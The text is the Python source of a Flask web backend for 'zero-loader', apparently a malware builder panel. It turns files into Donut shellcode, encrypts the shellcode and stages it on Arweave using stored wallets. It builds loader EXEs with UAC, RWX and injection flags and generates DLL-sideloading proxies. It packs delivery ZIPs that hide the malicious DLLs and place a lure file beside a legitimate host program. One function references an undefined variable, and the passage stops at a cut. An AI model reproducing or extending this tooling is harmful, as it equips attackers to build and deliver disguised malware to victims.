"""
zero-loader web UI backend (Flask, single-file).
*** LOCAL-USE ONLY *** Binds to 127.0.0.1.

Storage layout
──────────────
web/data/profiles.json           ← build profiles only
web/workspace/donut/<id>/        ← donut job: meta.json + original file + shellcode.bin
web/workspace/arweave/<id>/      ← wallet:    meta.json + wallet.json (Arweave JWK)
web/workspace/encrypt/<id>/      ← encrypt run: meta.json + Payload.h + key.txt + data.enc
web/workspace/builds/<id>/       ← build run:   meta.json + output.txt + <binary>
"""
from __future__ import annotations

import io
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import threading
import time
import uuid
import zipfile
from collections import defaultdict
from pathlib import Path

from flask import Flask, Response, jsonify, request, send_file, send_from_directory

PROJECT_ROOT   = Path(__file__).resolve().parent.parent
WEB_DIR        = Path(__file__).resolve().parent
STATIC_DIR     = WEB_DIR / "static"
WORKSPACE      = WEB_DIR / "workspace"
DATA_DIR       = WEB_DIR / "data"
WALLETS_DIR         = WORKSPACE / "arweave"  # each subdir: meta.json + wallet.json (JWK)
DONUT_DIR           = WORKSPACE / "donut"     # each subdir: meta.json + files
ENCRYPT_HISTORY_DIR = WORKSPACE / "encrypt"  # each subdir: meta.json + Payload.h + key.txt + data.enc
BUILD_HISTORY_DIR   = WORKSPACE / "builds"   # each subdir: meta.json + output.txt + binary (+ zip for sideload)
DLLS_DIR            = WORKSPACE / "dlls"     # each subdir: meta.json + the DLL file
EXES_DIR            = WORKSPACE / "exes"     # each subdir: meta.json + the EXE file
BINDS_DIR           = WORKSPACE / "binds"    # each subdir: meta.json + the bind/lure file
PROFILES_FILE       = DATA_DIR / "profiles.json"
ARWEAVE_SCRIPTS_DIR = PROJECT_ROOT / "arweave"
DONUT_EXE           = PROJECT_ROOT / "donut" / "donut.exe"

POOLS_DIR  = WORKSPACE / "pools"
POOLS_FILE = DATA_DIR  / "pools.json"

for _d in (WORKSPACE, DATA_DIR, WALLETS_DIR, DONUT_DIR, ENCRYPT_HISTORY_DIR, BUILD_HISTORY_DIR, DLLS_DIR, EXES_DIR, BINDS_DIR, POOLS_DIR):
    _d.mkdir(parents=True, exist_ok=True)

app = Flask(__name__, static_folder=str(STATIC_DIR), static_url_path="")

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

SAFE_NAME_RE  = re.compile(r"^[A-Za-z0-9._-]+$")
_ARW_ADDR_RE  = re.compile(r'^[A-Za-z0-9_-]{43}$')   # Arweave address (base64url, 43 chars)
_ID_RE        = re.compile(r'^[a-f0-9]{8}$')


def _safe_name(name: str) -> str | None:
    if not name or ".." in name:
        return None
    base = os.path.basename(name)
    return base if SAFE_NAME_RE.match(base) else None


def _new_id() -> str:
    return uuid.uuid4().hex[:8]


# ── Profiles (only thing stored in data/) ────────────────────────────────

def _load_profiles() -> list:
    if PROFILES_FILE.is_file():
        try:
            return json.loads(PROFILES_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return []


def _save_profiles(profiles: list) -> None:
    PROFILES_FILE.write_text(
        json.dumps(profiles, indent=2, ensure_ascii=False), encoding="utf-8"
    )


# ── Wallets (meta.json per wallet dir) ────────────────────────────────────

def _load_wallets() -> list:
    wallets: list[dict] = []
    if WALLETS_DIR.is_dir():
        for d in WALLETS_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        wallets.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(wallets, key=lambda w: -w.get("created_at", 0))


def _find_wallet(wid: str) -> dict | None:
    mf = WALLETS_DIR / wid / "meta.json"
    if mf.is_file():
        try:
            return json.loads(mf.read_text(encoding="utf-8"))
        except Exception:
            pass
    return None


def _save_wallet_meta(meta: dict) -> None:
    wdir = WALLETS_DIR / meta["id"]
    wdir.mkdir(parents=True, exist_ok=True)
    (wdir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")


# ── Donut jobs (meta.json per job dir) ────────────────────────────────────

def _load_donut_jobs() -> list:
    jobs: list[dict] = []
    if DONUT_DIR.is_dir():
        for d in DONUT_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        jobs.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(jobs, key=lambda j: -j.get("created_at", 0))


# ── Encrypt / Build history ───────────────────────────────────────────────

def _load_encrypt_history() -> list:
    jobs: list[dict] = []
    if ENCRYPT_HISTORY_DIR.is_dir():
        for d in ENCRYPT_HISTORY_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        jobs.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(jobs, key=lambda j: -j.get("created_at", 0))


def _load_build_history() -> list:
    jobs: list[dict] = []
    if BUILD_HISTORY_DIR.is_dir():
        for d in BUILD_HISTORY_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        jobs.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(jobs, key=lambda j: -j.get("created_at", 0))


# ── DLL / EXE workspace ───────────────────────────────────────────────────

def _load_asset_dir(base: Path) -> list:
    items: list[dict] = []
    if base.is_dir():
        for d in base.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        items.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(items, key=lambda x: -x.get("created_at", 0))


def _load_dlls() -> list:
    return _load_asset_dir(DLLS_DIR)


def _load_exes() -> list:
    return _load_asset_dir(EXES_DIR)


def _load_binds() -> list:
    return _load_asset_dir(BINDS_DIR)


def _find_asset(base: Path, aid: str) -> dict | None:
    mf = base / aid / "meta.json"
    if mf.is_file():
        try:
            return json.loads(mf.read_text(encoding="utf-8"))
        except Exception:
            pass
    return None


def _upload_asset(base: Path, upload, label: str) -> dict:
    """Save an uploaded file to base/<new_id>/. Returns meta dict."""
    name = _safe_name(upload.filename or label) or label
    aid  = _new_id()
    adir = base / aid
    adir.mkdir(parents=True, exist_ok=True)
    fpath = adir / name
    upload.save(str(fpath))
    meta = {
        "id":         aid,
        "name":       name,
        "size":       fpath.stat().st_size,
        "created_at": int(time.time()),
    }
    (adir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    return meta


def _cleanup_build_artifacts(binary_name: str | None = None) -> None:
    """Remove build intermediates, logs, and the output binary from PROJECT_ROOT.

    Called after every build (success or failure) so the working tree stays
    clean between runs.  Payload.h and source files are never touched.
    """
    # Compiler intermediates (build.bat removes most of these, but be thorough)
    for pat in ("*.obj", "*.exp", "*.lib", "*.res"):
        for f in PROJECT_ROOT.glob(pat):
            try:
                f.unlink()
            except Exception:
                pass
    # Debug / build log files
    for pat in ("*.log",):
        for f in PROJECT_ROOT.glob(pat):
            try:
                f.unlink()
            except Exception:
                pass
    # Output binary (already copied to workspace/builds/<id>/ on success)
    if binary_name:
        safe = _safe_name(binary_name)
        if safe:
            b = PROJECT_ROOT / safe
            if b.is_file() and b.suffix.lower() in (".exe", ".dll"):
                try:
                    b.unlink()
                except Exception:
                    pass
    # Generated header files (already archived in history on success)
    for fname in ("Payload.h", "Sideload.h", "Sideload.rc"):
        f = PROJECT_ROOT / fname
        if f.is_file():
            try:
                f.unlink()
            except Exception:
                pass


def _save_build_history(
    job_id: str, data: dict, mode: str, output_arg: str,
    returncode: int, output_text: str,
    zip_info: dict | None = None,
    sideload_h_size: int = 0,
) -> None:
    """Persist build run to workspace/builds/<id>/.
    zip_info: {"name": "<file>.zip", "size": N} — already written to hist_dir by caller.
    sideload_h_size: byte size of Sideload.h already copied to hist_dir (0 if absent).
    """
    ok          = (returncode == 0)
    binary_name = (output_arg if output_arg else "msoia.exe") if mode == "exe" else (output_arg if output_arg else "sideload.dll")

    hist_dir = BUILD_HISTORY_DIR / job_id
    hist_dir.mkdir(parents=True, exist_ok=True)

    meta: dict = {
        "id":             job_id,
        "created_at":     int(time.time()),
        "ok":             ok,
        "mode":           mode,
        "binary_name":    binary_name,
        "binary_size":    0,
        "uac":            bool(data.get("uac")),
        "rwx":            bool(data.get("rwx")),
        "debug":          bool(data.get("debug")),
        "inject":         inject,
        "zip_name":       zip_info.get("name") if zip_info else None,
        "zip_size":       zip_info.get("size", 0) if zip_info else 0,
        "sideload_h_size": sideload_h_size,
    }

    try:
        (hist_dir / "output.txt").write_text(output_text, encoding="utf-8", errors="replace")
    except Exception:
        pass

    binary_src = PROJECT_ROOT / binary_name
    if ok and binary_src.is_file():
        try:
            dest = hist_dir / binary_name
            shutil.copy2(str(binary_src), str(dest))
            meta["binary_size"] = dest.stat().st_size
        except Exception:
            pass

    try:
        (hist_dir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    except Exception:
        pass


# ── Subprocess runner ──────────────────────────────────────────────────────

def _run(argv: list[str], cwd: Path = PROJECT_ROOT) -> dict:
    try:
        proc = subprocess.run(argv, cwd=str(cwd), capture_output=True, text=True, timeout=120)
        return {"ok": proc.returncode == 0, "code": proc.returncode,
                "stdout": proc.stdout, "stderr": proc.stderr}
    except subprocess.TimeoutExpired as e:
        return {"ok": False, "code": -1, "stdout": e.stdout or "", "stderr": "timeout (120s)"}
    except FileNotFoundError as e:
        return {"ok": False, "code": -1, "stdout": "", "stderr": str(e)}


# ---------------------------------------------------------------------------
# Static
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    return send_from_directory(STATIC_DIR, "index.html")


# ---------------------------------------------------------------------------
# Encrypt
# ---------------------------------------------------------------------------

@app.route("/api/encrypt", methods=["POST"])
def api_encrypt():
    # Shellcode: from Donut workspace job or direct file upload
    shellcode_job_id    = (request.form.get("shellcode_job_id") or "").strip()
    donut_label         = ""
    donut_original_name = ""
    if shellcode_job_id and _ID_RE.match(shellcode_job_id):
        sc_path = DONUT_DIR / shellcode_job_id / "shellcode.bin"
        if not sc_path.is_file():
            return jsonify({"ok": False,
                            "stderr": f"shellcode.bin not found for Donut job {shellcode_job_id}"}), 404
        dmf = DONUT_DIR / shellcode_job_id / "meta.json"
        if dmf.is_file():
            try:
                dmeta               = json.loads(dmf.read_text(encoding="utf-8"))
                donut_label         = dmeta.get("label", "")
                donut_original_name = dmeta.get("original_name", "")
            except Exception:
                pass
    elif "shellcode" in request.files and request.files["shellcode"].filename:
        upload  = request.files["shellcode"]
        name    = _safe_name(upload.filename or "shellcode.bin") or "shellcode.bin"
        sc_path = WORKSPACE / name
        upload.save(str(sc_path))
    else:
        return jsonify({"ok": False,
                        "stderr": "shellcode source required — select a Donut job or upload a .bin file"}), 400

    # Optional wallet: resolve address and pass --wallet to Encrypt.py so
    # Payload.h is generated immediately with the wallet address embedded.
    wallet_id      = (request.form.get("wallet_id") or "").strip()
    wallet_address = ""
    if wallet_id and _ID_RE.match(wallet_id):
        wmeta = _find_wallet(wallet_id)
        if wmeta:
            wallet_address = wmeta.get("address", "")

    argv = [sys.executable, "Encrypt.py", str(sc_path)]
    if wallet_address and _ARW_ADDR_RE.match(wallet_address):
        argv += ["--wallet", wallet_address]

    result = _run(argv)

    key_path     = PROJECT_ROOT / "key.txt"
    payload_h    = PROJECT_ROOT / "Payload.h"
    key_text     = ""
    if key_path.is_file():
        key_text = key_path.read_text(errors="replace").strip()
        result["key"] = key_text

    # ── Persist to encrypt history ─────────────────────────────────────────
    job_id   = _new_id()
    hist_dir = ENCRYPT_HISTORY_DIR / job_id
    hist_dir.mkdir(parents=True, exist_ok=True)

    dat_name = "data.enc"
    dat_src  = PROJECT_ROOT / dat_name
    meta: dict = {
        "id":                  job_id,
        "created_at":          int(time.time()),
        "ok":                  result["ok"],
        "shellcode":           sc_path.name,
        "shellcode_job_id":    shellcode_job_id,
        "donut_label":         donut_label,
        "donut_original_name": donut_original_name,
        "dat_name":            dat_name,
        "dat_size":            0,
        "payload_h_size":      0,
        "key":                 key_text,
        "wallet_id":           wallet_id,
        "wallet_address":      wallet_address,
        # Filled in by publish after Arweave upload:
        "arweave_meta_tx_id":  "",
        "arweave_data_tx_id":  "",
    }
    if key_path.is_file():
        try:
            shutil.copy2(str(key_path), str(hist_dir / "key.txt"))
        except Exception:
            pass
    if dat_src.is_file():
        try:
            shutil.copy2(str(dat_src), str(hist_dir / dat_name))
            meta["dat_size"] = dat_src.stat().st_size
        except Exception:
            pass
    if payload_h.is_file():
        try:
            shutil.copy2(str(payload_h), str(hist_dir / "Payload.h"))
            meta["payload_h_size"] = payload_h.stat().st_size
        except Exception:
            pass
    try:
        (hist_dir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    except Exception:
        pass

    # Clean generated files from PROJECT_ROOT — they're now archived in history
    for _f in [key_path, dat_src, payload_h]:
        try:
            if _f.is_file():
                _f.unlink()
        except Exception:
            pass

    result["job_id"] = job_id
    return jsonify(result)


# ---------------------------------------------------------------------------
# Encrypt history
# ---------------------------------------------------------------------------

@app.route("/api/encrypt/history")
def api_encrypt_history_list():
    return jsonify(_load_encrypt_history())


@app.route("/api/encrypt/history/<jid>/download/<ftype>")
def api_encrypt_history_download(jid, ftype):
    if not _ID_RE.match(jid):
        return "invalid", 400
    job_dir = ENCRYPT_HISTORY_DIR / jid
    if not job_dir.is_dir():
        return "not found", 404

    if ftype == "payload_h":
        path, dl = job_dir / "Payload.h", "Payload.h"
    elif ftype == "dat":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        dat_name = json.loads(mf.read_text()).get("dat_name", "data.enc")
        safe = _safe_name(dat_name)
        if not safe:
            return "invalid", 400
        path, dl = job_dir / safe, safe
    elif ftype == "key":
        # Serve key.txt: if old-format key.txt exists use it directly,
        # otherwise extract the header from the combined data.enc.
        key_txt = job_dir / "key.txt"
        if key_txt.is_file():
            return send_file(str(key_txt), as_attachment=True, download_name="key.txt",
                             mimetype="text/plain")
        dat_path = job_dir / "data.enc"
        if not dat_path.is_file():
            return "not found", 404
        raw = dat_path.read_bytes()
        # Extract header: first 4 pipe-separated fields (key|nonce|size|compressed)
        parts = raw[:128].split(b"|", 4)
        if len(parts) < 5:
            return "data.enc is not in combined format", 400
        key_content = b"|".join(parts[:4])
        return Response(key_content, mimetype="text/plain",
                        headers={"Content-Disposition": 'attachment; filename="key.txt"'})
    else:
        return "invalid", 400

    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=dl)


@app.route("/api/encrypt/history/<jid>", methods=["DELETE"])
def api_encrypt_history_delete(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    jdir = ENCRYPT_HISTORY_DIR / jid
    if jdir.is_dir():
        shutil.rmtree(str(jdir), ignore_errors=True)
    return jsonify({"ok": True})


@app.route("/api/encrypt/history/<jid>/publish", methods=["POST"])
def api_encrypt_history_publish(jid):
    """Publish stored data.enc to Arweave using the wallet embedded at encrypt time."""
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    hist_dir = ENCRYPT_HISTORY_DIR / jid
    mf = hist_dir / "meta.json"
    if not mf.is_file():
        return jsonify({"ok": False, "stderr": "encrypt job not found"}), 404

    try:
        emeta = json.loads(mf.read_text(encoding="utf-8"))
    except Exception:
        return jsonify({"ok": False, "stderr": "failed to read encrypt job metadata"}), 500

    wallet_id = emeta.get("wallet_id", "")
    if not wallet_id or not _ID_RE.match(wallet_id):
        return jsonify({"ok": False, "stderr": "no wallet associated with this encrypt job — re-encrypt with a wallet selected"}), 400

    wallet_path = WALLETS_DIR / wallet_id / "wallet.json"
    if not wallet_path.is_file():
        return jsonify({"ok": False, "stderr": "wallet.json not found — wallet may have been deleted"}), 404

    dat_path = hist_dir / "data.enc"
    key_path = hist_dir / "key.txt"
    if not dat_path.is_file():
        return jsonify({"ok": False, "stderr": "data.enc not found for this encrypt job"}), 404

    # Support both old format (separate data.enc + key.txt) and new combined format.
    # Old format: key.txt exists alongside data.enc (binary-only).
    # New format: data.enc already starts with the header (no key.txt).
    combined_path = dat_path
    tmp_combined: Path | None = None
    if key_path.is_file():
        # Old format — combine in-memory: key_fragment + '|' + binary data
        key_fragment = key_path.read_text(encoding="utf-8").strip()
        enc_bytes = dat_path.read_bytes()
        combined_bytes = (key_fragment + "|").encode("ascii") + enc_bytes
        tmp_combined = hist_dir / "_combined.enc"
        tmp_combined.write_bytes(combined_bytes)
        combined_path = tmp_combined

    try:
        argv = [
            sys.executable,
            str(ARWEAVE_SCRIPTS_DIR / "upload.py"),
            str(combined_path), str(wallet_path),
            "--json",
        ]
        result = _run(argv)
        if result["ok"]:
            json_line = next(
                (l for l in result["stdout"].splitlines() if l.strip().startswith("{")),
                None,
            )
            if json_line:
                try:
                    parsed = json.loads(json_line)
                    result.update(parsed)
                    result["stdout"] = ""
                except Exception:
                    pass

        if result.get("ok") and result.get("tx_id"):
            try:
                emeta["arweave_tx_id"] = result["tx_id"]
                emeta.pop("arweave_meta_tx_id", None)
                emeta.pop("arweave_data_tx_id", None)
                mf.write_text(json.dumps(emeta, indent=2), encoding="utf-8")
            except Exception:
                pass
    finally:
        if tmp_combined and tmp_combined.is_file():
            tmp_combined.unlink(missing_ok=True)

    return jsonify(result)


# ---------------------------------------------------------------------------
# Sideload
# ---------------------------------------------------------------------------

@app.route("/api/sideload", methods=["POST"])
def api_sideload():
    if "dll" not in request.files:
        return jsonify({"ok": False, "stderr": "dll file missing"}), 400
    upload   = request.files["dll"]
    name     = _safe_name(upload.filename or "target.dll") or "target.dll"
    dll_path = WORKSPACE / name
    upload.save(str(dll_path))
    rename = (request.form.get("rename") or "").strip()
    exe    = (request.form.get("exe") or "").strip()
    argv   = [sys.executable, "SideloadGen.py", str(dll_path)]
    if rename:
        safe = _safe_name(rename)
        if not safe:
            return jsonify({"ok": False, "stderr": "invalid rename"}), 400
        argv += ["--rename", safe]
    if exe:
        safe = _safe_name(exe)
        if not safe:
            return jsonify({"ok": False, "stderr": "invalid exe"}), 400
        argv += ["--exe", safe]
    return jsonify(_run(argv))


# ---------------------------------------------------------------------------
# Build (streaming)
# ---------------------------------------------------------------------------

VALID_MODES = {"exe", "sideload"}


@app.route("/api/build", methods=["POST"])
def api_build():
    data  = request.get_json(force=True, silent=True) or {}
    mode  = data.get("mode", "exe")
    if mode not in VALID_MODES:
        return jsonify({"ok": False, "stderr": f"invalid mode: {mode}"}), 400
    uac    = bool(data.get("uac"))
    rwx    = bool(data.get("rwx"))
    debug  = bool(data.get("debug"))
    inject = bool(data.get("inject")) and mode == "sideload"

    # ── Payload.h: copy from encrypt history if requested ────────────────
    enc_hist_id = (data.get("encrypt_history_id") or "").strip()
    if enc_hist_id and _ID_RE.match(enc_hist_id):
        ph_src = ENCRYPT_HISTORY_DIR / enc_hist_id / "Payload.h"
        ph_dst = PROJECT_ROOT / "Payload.h"
        if ph_src.is_file():
            shutil.copy2(str(ph_src), str(ph_dst))

    # ── EXE output name (optional) ───────────────────────────────────────
    exe_output_name = (data.get("exe_output_name") or "").strip()
    if exe_output_name:
        exe_output_name = _safe_name(exe_output_name) or ""
        if exe_output_name and not exe_output_name.lower().endswith(".exe"):
            exe_output_name += ".exe"

    # ── sideload-specific inputs ──────────────────────────────────────────
    dll_id          = (data.get("dll_id")          or "").strip()
    exe_id          = (data.get("exe_id")          or "").strip()
    sideload_rename = (data.get("sideload_rename") or "").strip()
    host_rename     = (data.get("host_rename")     or "").strip()
    zip_name        = (data.get("zip_name")        or "").strip()
    bind_id         = (data.get("bind_id")         or "").strip()
    bind_rename     = (data.get("bind_rename")     or "").strip()

    # Resolve sideload assets up-front (before streaming starts)
    dll_name = exe_name = ""
    dll_path_obj: Path | None = None
    exe_path_obj: Path | None = None

    if mode == "sideload":
        if not dll_id or not _ID_RE.match(dll_id):
            return jsonify({"ok": False, "stderr": "DLL must be selected from the Sideload workspace"}), 400
        if not exe_id or not _ID_RE.match(exe_id):
            return jsonify({"ok": False, "stderr": "Host EXE must be selected from the Sideload workspace"}), 400
        if not zip_name:
            return jsonify({"ok": False, "stderr": "ZIP output name is required for sideload builds"}), 400

        dll_meta = _find_asset(DLLS_DIR, dll_id)
        exe_meta = _find_asset(EXES_DIR, exe_id)
        if not dll_meta:
            return jsonify({"ok": False, "stderr": f"DLL {dll_id} not found in workspace"}), 404
        if not exe_meta:
            return jsonify({"ok": False, "stderr": f"EXE {exe_id} not found in workspace"}), 404

        dll_name     = dll_meta["name"]
        exe_name     = exe_meta["name"]
        dll_path_obj = DLLS_DIR / dll_id / dll_name
        exe_path_obj = EXES_DIR / exe_id / exe_name

        if not dll_path_obj.is_file():
            return jsonify({"ok": False, "stderr": f"DLL file missing for {dll_id}"}), 404
        if not exe_path_obj.is_file():
            return jsonify({"ok": False, "stderr": f"EXE file missing for {exe_id}"}), 404

    # Resolve optional bind file
    bind_name     = ""
    bind_path_obj: Path | None = None
    if bind_id and _ID_RE.match(bind_id):
        bind_meta = _find_asset(BINDS_DIR, bind_id)
        if bind_meta:
            bind_name     = bind_meta["name"]
            bind_path_obj = BINDS_DIR / bind_id / bind_name
            if not bind_path_obj.is_file():
                bind_path_obj = None  # silently skip if file is missing

    # safe ZIP filename
    safe_zip = ""
    if zip_name:
        raw      = zip_name if zip_name.lower().endswith(".zip") else zip_name + ".zip"
        safe_zip = _safe_name(raw) or "output.zip"

    env    = os.environ.copy()
    extras: list[str] = []
    if rwx:    extras.append("/DRWX_SHELLCODE")
    if debug:  extras.append("/DDEBUG")
    if inject: extras.append("/DENABLE_INJECT")
    if extras:
        env["CFLAGS_EXTRA"] = " ".join(extras)

    job_id = _new_id()

    def stream():
        buf: list[str] = []
        zip_info: dict = {}

        if mode == "sideload":
            effective_output = dll_name   # proxy DLL gets the target DLL's name
            build_args = ["build.bat", "sideload", dll_name]
            sg_argv = [sys.executable, "SideloadGen.py", str(dll_path_obj),
                       "--exe", exe_name]
            if sideload_rename:
                sg_safe = _safe_name(sideload_rename)
                if sg_safe:
                    sg_argv += ["--rename", sg_safe]
        else:
            effective_output = exe_output_name or "msoia.exe"
            build_args = ["build.bat"]
            sg_argv = None
            if exe_output_name:
                env["OUTNAME"] = exe_output_name

        if uac:
            build_args.append("uac")

        # Header
        header = ""
        if sg_argv:
            header += f"$ {' '.join(shlex.quote(a) for a in sg_argv)}\n"
        header += f"$ {' '.join(shlex.quote(a) for a in build_args)}\n"
        if extras:
            header += f"CFLAGS_EXTRA={' '.join(extras)}\n"
        header += "\n"
        yield header
        buf.append(header)

        # ── Step 1: SideloadGen.py (sideload only) ────────────────────────
        if sg_argv:
            msg = f"[*] Generating Sideload.h for {dll_name} …\n\n"
            yield msg; buf.append(msg)
            sg = _run(sg_argv)
            if sg["stdout"]: yield sg["stdout"]; buf.append(sg["stdout"])
            if sg["stderr"]: yield sg["stderr"]; buf.append(sg["stderr"])
            sg_exit = f"\n[SideloadGen exit {sg['code']}]\n\n"
            yield sg_exit; buf.append(sg_exit)
            if not sg["ok"]:
                _save_build_history(job_id, data, mode, effective_output, -1, "".join(buf))
                _cleanup_build_artifacts()
                return

        # ── Step 2: build.bat ─────────────────────────────────────────────
        returncode = -1
        try:
            proc = subprocess.Popen(build_args, cwd=str(PROJECT_ROOT), env=env,
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    bufsize=1, text=True, shell=True)
        except FileNotFoundError as e:
            err = f"[error] {e}\n"
            yield err; buf.append(err)
            _save_build_history(job_id, data, mode, effective_output, -1, "".join(buf))
            _cleanup_build_artifacts()
            return

        assert proc.stdout is not None
        try:
            for line in proc.stdout:
                yield line; buf.append(line)
        finally:
            proc.wait()
            returncode = proc.returncode
            ok         = (returncode == 0)
            exit_line  = f"\n[exit {returncode}]\n"
            yield exit_line; buf.append(exit_line)

            # ── Step 3: create delivery ZIP (sideload success only) ────────
            # Windows file attribute flags encoded in ZIP external_attr (high word)
            #   FILE_ATTRIBUTE_ARCHIVE  = 0x20
            #   FILE_ATTRIBUTE_HIDDEN   = 0x02
            #   FILE_ATTRIBUTE_DIRECTORY= 0x10
            _ATTR_HIDDEN_FILE = 0x20 | 0x02   # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE (MS-DOS lower 16 bits)
            _ATTR_HIDDEN_DIR  = 0x10 | 0x02   # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY

            def _zip_write_hidden(zf: zipfile.ZipFile, src: str, arc: str) -> None:
                """Write src into the ZIP as arc with Windows hidden+archive attr."""
                zi = zipfile.ZipInfo(arc)
                zi.compress_type    = zipfile.ZIP_DEFLATED
                zi.external_attr    = _ATTR_HIDDEN_FILE
                with open(src, "rb") as fh:
                    zf.writestr(zi, fh.read())

            if ok and mode == "sideload" and dll_path_obj and exe_path_obj and safe_zip:
                try:
                    hist_dir = BUILD_HISTORY_DIR / job_id
                    hist_dir.mkdir(parents=True, exist_ok=True)
                    zip_path = hist_dir / safe_zip

                    with zipfile.ZipFile(str(zip_path), "w", zipfile.ZIP_DEFLATED) as zf:
                        # 1. Built proxy DLL — hidden attribute
                        proxy = PROJECT_ROOT / dll_name
                        if proxy.is_file():
                            _zip_write_hidden(zf, str(proxy), dll_name)
                        # 2. Original DLL (renamed) — hidden attribute
                        orig_arc = sideload_rename if sideload_rename else (
                            Path(dll_name).stem + "_orig" + Path(dll_name).suffix)
                        if dll_path_obj.is_file():
                            _zip_write_hidden(zf, str(dll_path_obj), orig_arc)
                        # 3. Host EXE — normal attributes
                        if exe_path_obj.is_file():
                            zf.write(str(exe_path_obj), host_rename if host_rename else exe_name)
                        # 4. Bind file — placed inside hidden _\ folder
                        if bind_path_obj and bind_path_obj.is_file():
                            bind_arc_name = bind_rename if bind_rename else bind_name
                            safe_bind_arc = _safe_name(bind_arc_name) or bind_name
                            # Add hidden _\ directory entry
                            dir_zi = zipfile.ZipInfo("_/")
                            dir_zi.external_attr = _ATTR_HIDDEN_DIR
                            zf.writestr(dir_zi, b"")
                            # Add bind file inside it
                            bind_zi = zipfile.ZipInfo(f"_/{safe_bind_arc}")
                            bind_zi.compress_type = zipfile.ZIP_DEFLATED
                            bind_zi.external_attr = 0  # normal file — no hidden attr
                            with open(str(bind_path_obj), "rb") as fh:
                                zf.writestr(bind_zi, fh.read())

                    zip_size = zip_path.stat().st_size
                    zip_info = {"name": safe_zip, "size": zip_size}
                    zline = f"\n[+] ZIP: {safe_zip}  ({zip_size // 1024} KB)\n"
                    yield zline; buf.append(zline)
                except Exception as ze:
                    zline = f"\n[!] ZIP creation failed: {ze}\n"
                    yield zline; buf.append(zline)

            # ── Step 4: save Sideload.h (sideload success only) ───────────
            sideload_h_size = 0
            if ok and mode == "sideload":
                sh_src = PROJECT_ROOT / "Sideload.h"
                if sh_src.is_file():
                    try:
                        _hd = BUILD_HISTORY_DIR / job_id
                        _hd.mkdir(parents=True, exist_ok=True)
                        dest = _hd / "Sideload.h"
                        shutil.copy2(str(sh_src), str(dest))
                        sideload_h_size = dest.stat().st_size
                    except Exception:
                        pass

            _save_build_history(job_id, data, mode, effective_output, returncode,
                                "".join(buf), zip_info or None, sideload_h_size)
            _cleanup_build_artifacts(effective_output)

    return Response(stream(), mimetype="text/plain; charset=utf-8")


# ---------------------------------------------------------------------------
# Artifacts
# ---------------------------------------------------------------------------

@app.route("/api/artifacts")
def api_artifacts():
    seen: dict[str, dict] = {}
    for pat in ("*.exe", "*.dll"):
        for f in PROJECT_ROOT.glob(pat):
            if f.name not in seen:
                seen[f.name] = {"name": f.name, "size": f.stat().st_size,
                                 "mtime": int(f.stat().st_mtime)}
    return jsonify(sorted(seen.values(), key=lambda x: -x["mtime"]))


@app.route("/api/download/<name>")
def api_download(name):
    safe = _safe_name(name)
    if not safe:
        return "invalid", 400
    path = PROJECT_ROOT / safe
    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=safe)



# ---------------------------------------------------------------------------
# Build history
# ---------------------------------------------------------------------------

@app.route("/api/build/history")
def api_build_history_list():
    return jsonify(_load_build_history())


@app.route("/api/build/history/<jid>/download/<ftype>")
def api_build_history_download(jid, ftype):
    if not _ID_RE.match(jid):
        return "invalid", 400
    job_dir = BUILD_HISTORY_DIR / jid
    if not job_dir.is_dir():
        return "not found", 404

    if ftype == "output":
        path, dl = job_dir / "output.txt", "build_output.txt"
    elif ftype == "binary":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        binary_name = json.loads(mf.read_text()).get("binary_name", "msoia.exe")
        safe = _safe_name(binary_name)
        if not safe:
            return "invalid", 400
        path, dl = job_dir / safe, safe
    elif ftype == "zip":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        zip_name_val = json.loads(mf.read_text()).get("zip_name")
        if not zip_name_val:
            return "not found", 404
        safe = _safe_name(zip_name_val)
        if not safe:
            return "invalid", 400
        path, dl = job_dir / safe, safe
    elif ftype == "sideload_h":
        path, dl = job_dir / "Sideload.h", "Sideload.h"
    else:
        return "invalid", 400

    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=dl)


@app.route("/api/build/history/<jid>", methods=["DELETE"])
def api_build_history_delete(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    jdir = BUILD_HISTORY_DIR / jid
    if jdir.is_dir():
        shutil.rmtree(str(jdir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Profiles  (web/data/profiles.json)
# type = "encrypt" | "build"   (legacy entries without type treated as "encrypt")
# ---------------------------------------------------------------------------

@app.route("/api/profiles/encrypt")
def api_profiles_encrypt_list():
    return jsonify([p for p in _load_profiles() if p.get("type", "encrypt") == "encrypt"])


@app.route("/api/profiles/encrypt", methods=["POST"])
